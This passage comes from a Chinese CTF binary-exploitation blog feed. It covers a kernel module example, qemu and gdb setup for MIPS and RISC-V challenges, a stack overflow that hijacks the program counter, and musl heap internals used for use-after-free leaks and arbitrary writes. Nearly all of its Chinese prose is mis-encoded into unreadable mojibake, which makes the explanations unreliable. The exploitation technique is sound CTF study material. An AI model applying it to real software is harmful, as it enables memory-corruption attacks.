title="lemon"></a>lemon</h1><p>è¿™ä¸€å—è¯´æ˜¯è€ƒå¯Ÿrand()ä¸å®‰å…¨éšæœºæ•°æ¥å£</p><p>æ²¡ç»™å®šç§å­çš„rand()ï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯å›ºå®šçš„ï¼Œä½†è¿˜æ˜¯æ²¡å¤ªæ˜ç™½è¿™è§£é¢˜æ–¹æ³•å“ªé‡Œç”¨åˆ°äº†å›ºå®šéšæœºæ•°ğŸ˜—</p><p>åªè¦bufè¾“å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œå°±å¯ä»¥å¾ªç¯randå¤šæ¬¡ï¼Œåªè¦æœ‰ä¸€æ¬¡ç¬¦åˆæ¡ä»¶å°±å¯ä»¥è¿”å›1</p><p><img src="/2021/09/20/2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn-wp/image-20210920134010284.png" alt="image-20210920134010284"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;åˆæ˜¯æ‹–äº†å¥½ä¹…çš„å¤ç°ï¼Œç¥¥pwnæ¯ğŸ˜…&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel_pwnåˆæ¢</title>
    <link href="https://brooke-hub.github.io/2021/09/09/kernel-pwn%E5%88%9D%E6%8E%A2/"/>
    <id>https://brooke-hub.github.io/2021/09/09/kernel-pwn%E5%88%9D%E6%8E%A2/</id>
    <published>2021-09-09T10:49:49.000Z</published>
    <updated>2021-09-13T09:13:34.901Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ä¹‹å‰å®åœ¨çœ‹ä¸æ‡‚Wikiä¸Šçš„å…¥é—¨è®²è§£ï¼Œç°åœ¨è·Ÿç€è½©å“¥åšå®¢è¯•ç€å…¥é—¨kernel</p></blockquote><span id="more"></span><h2 id="æ­£å‘å¼€å‘"><a href="#æ­£å‘å¼€å‘" class="headerlink" title="æ­£å‘å¼€å‘"></a>æ­£å‘å¼€å‘</h2><p>ä»<a href="https://blog.csdn.net/qb_2008/article/details/6835677">hello world</a> å¼€å§‹</p><p>è¿™é‡Œç¼–è¯‘ç”Ÿæˆmodule.koæ—¶ä¼šé‡åˆ°ä¸€ä¸ªæŠ¥é”™</p><p><img src="/2021/09/09/kernel-pwn%E5%88%9D%E6%8E%A2/image-20210909185354811.png" alt="image-20210909185354811"></p><p>è¿™æ˜¯å› ä¸ºå‡½æ•°åŸå‹å’Œè°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶äº§ç”Ÿäº†å†²çªï¼Œå¦‚å‚æ•°ç±»å‹ä¸ä¸€æ ·ç­‰</p><p>æ‰€ä»¥åŠ ä¸Šå‚æ•°ç±»å‹voidå°±å¯ä»¥äº† </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, exit!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure><p>ä¹‹åï¼Œ å°†module.koåŠ å…¥å†…æ ¸æ¨¡å—ï¼Œæ³¨æ„ç”Ÿæˆçš„æ¨¡å—åå­—ä¸èƒ½ä»¥moduleå‘½åï¼Œå¦åˆ™å°±ä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™</p><p><img src="/2021/09/09/kernel-pwn%E5%88%9D%E6%8E%A2/image-20210909190445406.png" alt="image-20210909190445406"></p><p>moduleæ”¹æˆhelloworldå°±å¥½äº†</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KERNEL_DIR := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">helloworld-objs := hello.o</span><br><span class="line">obj-m := helloworld.o</span><br><span class="line"><span class="section">default:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNEL_DIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dmesg | tail -n 1</span><br><span class="line">[49780.637874] Hello, world!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">dmesg | tail -n 2</span></span><br><span class="line">[49622.167231] module: module is already loaded</span><br><span class="line">[49780.637874] Hello, world!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">sudo rmmod helloworld</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">dmesg | tail -n 2</span></span><br><span class="line">[49780.637874] Hello, world!</span><br><span class="line">[50164.206571] Hello, exit!</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ä¹‹å‰å®åœ¨çœ‹ä¸æ‡‚Wikiä¸Šçš„å…¥é—¨è®²è§£ï¼Œç°åœ¨è·Ÿç€è½©å“¥åšå®¢è¯•ç€å…¥é—¨kernel&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="kernel" scheme="https://brooke-hub.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>MIPS_PWN_å…¥é—¨</title>
    <link href="https://brooke-hub.github.io/2021/09/09/MIPS-PWN-%E5%85%A5%E9%97%A8/"/>
    <id>https://brooke-hub.github.io/2021/09/09/MIPS-PWN-%E5%85%A5%E9%97%A8/</id>
    <published>2021-09-09T03:58:37.000Z</published>
    <updated>2021-09-13T09:13:52.492Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ•´ç†ä¸€ä¸‹mips</p></blockquote><span id="more"></span><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>mipsrop</p><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="Mplogin"><a href="#Mplogin" class="headerlink" title="Mplogin"></a>Mplogin</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">file Mplogin</span> </span><br><span class="line">Mplogin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">checksec Mplogin</span></span><br><span class="line">[*] &#x27;/home/wendy/Desktop/mips/Mplogin/Mplogin&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨qemuçš„useræ¨¡å¼mipselï¼ˆå°ç«¯ï¼‰è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">tree -N -L 2</span></span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ lib</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ld-uClibc.so.0</span><br><span class="line">â”‚Â Â  â””â”€â”€ libc.so.0</span><br><span class="line">â””â”€â”€ Mplogin</span><br><span class="line"></span><br><span class="line">1 directory, 3 files</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™äº†lib ç›´æ¥-L ./ åŠ è½½å½“å‰ç›®å½•çš„libåº“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">qemu-mipsel -L ./ Mplogin</span> </span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>idaåˆ†æä¸€ä¸‹</p><p>sub_400840å‡½æ•°ï¼Œå†æ¬¡æ‰“å°æ—¶ä½¿ç”¨%så¯ä»¥æ‰“å°å‡ºæ ˆä¿¡æ¯</p><p>sub_400978å‡½æ•°ï¼Œå¯ä»¥æ ˆæº¢å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">qemu-mipsel -g 1237 -L ./ Mplogin</span> </span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : adminbbbb</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb-multiarch</span> </span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> ls</span></span><br><span class="line">lib  Mplogin</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> file Mplogin</span> </span><br><span class="line">Reading symbols from Mplogin...</span><br><span class="line">(No debugging symbols found in Mplogin)</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> architecture mips</span></span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> target remote :1237</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *0x00400920</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/09/MIPS-PWN-%E5%85%A5%E9%97%A8/image-20210909151721939.png" alt="image-20210909151721939"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ•´ç†ä¸€ä¸‹mips&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="mips" scheme="https://brooke-hub.github.io/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>RISC-V_pwn_åˆæ¢</title>
    <link href="https://brooke-hub.github.io/2021/09/09/RISC-V-pwn-%E5%88%9D%E6%8E%A2/"/>
    <id>https://brooke-hub.github.io/2021/09/09/RISC-V-pwn-%E5%88%9D%E6%8E%A2/</id>
    <published>2021-09-09T02:04:00.000Z</published>
    <updated>2021-09-13T09:12:14.956Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‹–äº†å¾ˆä¹…çš„å¼‚æ„pwnï¼Œæ‰“ç®—ç”¨*ctf2021çš„ä¸€é“æ ˆæº¢å‡ºæ¥å…¥é—¨</p></blockquote><span id="more"></span><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb-multiarch -v</span></span><br><span class="line">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•æ ˆæº¢å‡º"><a href="#æµ‹è¯•æ ˆæº¢å‡º" class="headerlink" title="æµ‹è¯•æ ˆæº¢å‡º"></a>æµ‹è¯•æ ˆæº¢å‡º</h2><p>ç›´æ¥ç”¨é¢˜ç›®ç»™çš„qemu-riscv64è¿è¡Œå³å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./qemu-riscv64 -g 1234 ./main</span> </span><br><span class="line">Input the flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">You are wrong ._.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨gefè°ƒè¯•æ–¹ä¾¿riscvå¯„å­˜å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb-multiarch</span> </span><br><span class="line"></span><br><span class="line">gefâ¤  file main</span><br><span class="line">Reading symbols from main...</span><br><span class="line">(No debugging symbols found in main)</span><br><span class="line">gefâ¤  set architecture riscv:rv64 </span><br><span class="line">The target architecture is assumed to be riscv:rv64</span><br><span class="line">gefâ¤  target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">0x00000000000101c0 in ?? ()</span><br><span class="line"></span><br><span class="line">gefâ¤  c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x6161616161616160 in ?? ()</span><br><span class="line"></span><br><span class="line">gefâ¤  p $pc</span><br><span class="line"><span class="meta">$</span><span class="bash">1 = (void (*)()) 0x6161616161616160</span></span><br><span class="line">gefâ¤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰NXï¼Œæ‰€ä»¥ä¸€èˆ¬çš„æ€è·¯éƒ½æ˜¯ret2shellcode</p><p>qemu-userçš„å„ç§åœ°å€åœ¨åŒä¸€ä¸ªç¯å¢ƒä¸‹éƒ½æ˜¯å›ºå®šçš„ï¼ŒåŒ…æ‹¬æ ˆåœ°å€ï¼Œæ‰€ä»¥éœ€è¦çŸ¥é“è¿œç«¯çš„æ ˆåœ°å€ï¼Œç„¶åæŠŠshellcodeæ”¾åœ¨æ ˆä¸Š</p><p>é¢˜ç›®ç»™äº†è¿œç¨‹ç¯å¢ƒçš„dockerï¼Œå¯ä»¥æœ¬åœ°è°ƒè¯•å¾—åˆ°è¿œç«¯åœ°å€</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‹–äº†å¾ˆä¹…çš„å¼‚æ„pwnï¼Œæ‰“ç®—ç”¨*ctf2021çš„ä¸€é“æ ˆæº¢å‡ºæ¥å…¥é—¨&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="å¼‚æ„" scheme="https://brooke-hub.github.io/tags/%E5%BC%82%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>musl_pwn_åˆæ¢</title>
    <link href="https://brooke-hub.github.io/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/"/>
    <id>https://brooke-hub.github.io/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/</id>
    <published>2021-09-05T02:25:28.000Z</published>
    <updated>2021-09-19T08:54:38.425Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‡†å¤‡å¤ç°5é“musl pwnï¼Œå…¶ä¸­4é“éƒ½æ˜¯1.2.2ç‰ˆæœ¬çš„ï¼Œæºç å®åœ¨çœ‹ä¸ä¸‹å»å‘œå‘œå‘œï¼Œè¿˜æ˜¯è·Ÿä¹‹å‰å­¦glibcä¸€æ ·ï¼Œç›´æ¥å»gdbçœ‹æ•°æ®æ¥ç†è§£ç»“æ„å’Œå†…å­˜ç®¡ç†ã€‚muslé‡Œæ²¡æœ‰malloc_hookå’Œfree_hookï¼Œæ‰€ä»¥ä¿æŠ¤å…¨å¼€çš„æ—¶å€™é€šå¸¸åªèƒ½æ‰“FILEç»“æ„ä½“ã€‚å…ˆä»ç±»ä¼¼glibcçš„1.1.24ç‰ˆæœ¬å…¥æ‰‹ã€‚</p></blockquote><span id="more"></span><h1 id="Version-1-1-24"><a href="#Version-1-1-24" class="headerlink" title="Version 1.1.24"></a>Version 1.1.24</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><blockquote><p><a href="https://musl.libc.org/">musl libc</a> æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºåµŒå…¥å¼ç³»ç»Ÿå¼€å‘çš„è½»é‡çº§ libc åº“ï¼Œä»¥ç®€å•ã€è½»é‡å’Œé«˜æ•ˆç‡ä¸ºç‰¹è‰²ã€‚æœ‰ä¸å°‘ Linux å‘è¡Œç‰ˆå°†å…¶è®¾ä¸ºé»˜è®¤çš„ libc åº“ï¼Œç”¨æ¥ä»£æ›¿ä½“ç§¯è‡ƒè‚¿çš„ glibc ï¼Œå¦‚ <a href="https://zh.wikipedia.org/zh-cn/Alpine_Linux">Alpine Linux</a>ï¼ˆåšè¿‡ Docker é•œåƒçš„åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼‰ã€<a href="https://zh.wikipedia.org/wiki/OpenWrt">OpenWrt</a>ï¼ˆå¸¸ç”¨äºè·¯ç”±å™¨ï¼‰å’Œ Gentoo ç­‰ã€‚</p><p>musl libc å †ç®¡ç†å™¨çº¦ç­‰åŒäº<code>dlmalloc</code>ï¼ˆglibc å †ç®¡ç†å™¨<code>ptmalloc2</code>çš„å‰èº«ï¼‰ï¼Œå› æ­¤æŸäº›éƒ¨åˆ†å¦‚ chunkã€unbin ä¸ glibc ååˆ†ç›¸ä¼¼ã€‚</p></blockquote><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><p>è¯¦ç»†è®²è§£ <a href="https://www.anquanke.com/post/id/202253#h2-4">ä»ä¸€æ¬¡ CTF å‡ºé¢˜è°ˆ musl libc å †æ¼æ´åˆ©ç”¨</a></p><p>æºç  <a href="https://github.com/bminor/musl/blob/v1.1.24/src/malloc/malloc.c">v1.1.24/src/malloc/malloc.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; <span class="comment">// ç›¸å½“äº glibc çš„ prev size å’Œ size</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>psizeå’Œcsizeæœ€ä½ä½éƒ½æ˜¯inuseæ ‡å¿—ä½</p><p><strong>chunk å¤§å°ï¼šä»0x20å¼€å§‹ï¼Œä»¥0x20è·¨åº¦é€’å¢ï¼ˆè€Œä¸æ˜¯0x10ï¼‰</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure><p><code>mal</code>ç»“æ„ä½“ç±»ä¼¼äº glibc ä¸­çš„<code>main_arena</code></p><p>æœ‰ä¸‰ä¸ªæˆå‘˜ï¼š64ä½æ— ç¬¦å·æ•´æ•°<code>binmap</code>ã€é“¾è¡¨å¤´éƒ¨æ•°ç»„<code>bins</code>å’Œé”<code>free_lock</code>ã€‚</p><p><code>binmap</code>è®°å½•æ¯ä¸ª bin æ˜¯å¦ä¸ºéç©ºï¼Œè‹¥æŸä¸ªæ¯”ç‰¹ä½ä¸º 1ï¼Œè¡¨ç¤ºå¯¹åº”çš„ bin ä¸ºéç©ºï¼Œå³ bin é“¾è¡¨ä¸­æœ‰ chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>bin æ˜¯ç”± 64 ä¸ªç»“æ„ç±»ä¼¼ small bin çš„åŒå‘å¾ªç¯é“¾è¡¨ç»„æˆï¼Œç»´æŠ¤é“¾è¡¨çš„æ–¹å¼æ˜¯ FILOï¼ˆä»é“¾è¡¨é¦–éƒ¨å–å‡º chunkï¼Œä»å°¾éƒ¨æ’å…¥ chunkï¼‰ã€‚</p><p>mallocå¤§æ¦‚è¿‡ç¨‹ï¼š</p><p>æ ¹æ®sizeè®¡ç®—å‡ºå¯¹åº”binçš„ç´¢å¼•ï¼Œç„¶åæŸ¥æ‰¾binmapçœ‹çœ‹å¯¹åº”binä¸Šæœ‰æ²¡æœ‰ç©ºé—²chunkï¼Œå¦‚æœæœ‰å°±unbinæ“ä½œå–å‡ºheadæŒ‡å‘çš„chunk</p><h2 id="å¸¸è§åˆ©ç”¨"><a href="#å¸¸è§åˆ©ç”¨" class="headerlink" title="å¸¸è§åˆ©ç”¨"></a>å¸¸è§åˆ©ç”¨</h2><p>å–å‡º chunk çš„è¿‡ç¨‹ä¸­æ²¡æœ‰å¯¹é“¾è¡¨å’Œ chunk å¤´éƒ¨è¿›è¡Œä»»ä½•æ£€æŸ¥ã€‚</p><p>åˆ©ç”¨unbinå°†ç›®æ ‡åœ°å€æ’å…¥binä¸­ï¼Œå®ç°ä»»æ„åœ°å€å†™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">c-&gt;csize |= C_INUSE;</span><br><span class="line">NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="WMCTF-2021-Nescafe"><a href="#WMCTF-2021-Nescafe" class="headerlink" title="WMCTF_2021_Nescafe"></a><strong>WMCTF_2021_Nescafe</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./libc.so</span> </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.1.24</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure><p>musl 1.1.24çš„ç‰ˆæœ¬å’Œglibcå·®ä¸å¤š</p><p>chunkç»“æ„å¾ˆç›¸ä¼¼ï¼Œå¸¸ç”¨çš„å°binç®¡ç†ç±»ä¼¼äºsmallbinçš„åŒå‘é“¾è¡¨ç®¡ç†</p><p>æœ¬é¢˜expå‚è€ƒ <a href="https://blog.csdn.net/qq_39948058/article/details/120035403?spm=1001.2014.3001.5501">WMCTF 2021 pwn Azlyå¤ç°</a></p><h3 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a><strong>é™æ€åˆ†æ</strong></h3><p>æ²™ç®±ç¦ç”¨äº†execve</p><p>chunk size 0x200</p><p>idx 0-4</p><p>freeåæŒ‡é’ˆæ²¡ç½®é›¶ï¼Œå¯ä»¥editå’Œshow</p><p>åªèƒ½showä¸€æ¬¡</p><h3 id="how-to-leak"><a href="#how-to-leak" class="headerlink" title="how to leak"></a><strong>how to leak</strong></h3><p>chunkè¢«é‡Šæ”¾åè¢«æ’å…¥binï¼ˆmal+384ï¼‰ï¼Œä»¥åŒå‘é“¾è¡¨è¿›è¡Œç®¡ç†</p><p>chunkçš„<code>next*</code>å’Œ<code>pre*</code>æŒ‡é’ˆåŸŸå°±ä¼šè¢«å†™å…¥binåœ°å€</p><p>å¯ä»¥uafï¼Œç›´æ¥show å¾—åˆ°libcåœ°å€</p><h3 id="how-to-hijack"><a href="#how-to-hijack" class="headerlink" title="how to hijack"></a><strong>how to hijack</strong></h3><blockquote><p>gdbä¸‹ä½¿ç”¨ <code>p mal</code> å¯ä»¥æŸ¥çœ‹æ‰€æœ‰bin</p></blockquote><p>â‘ å¦‚ä¸‹mal+384å¯ä»¥ç†è§£æˆbin</p><p>é¦–å…ˆaddä¸¤ä¸ª0x200çš„chunkï¼Œbinä¸€ç›´æŒ‡å‘top chunkä»¥ä¾¿ä¸‹æ¬¡åˆ†é…</p><p>free 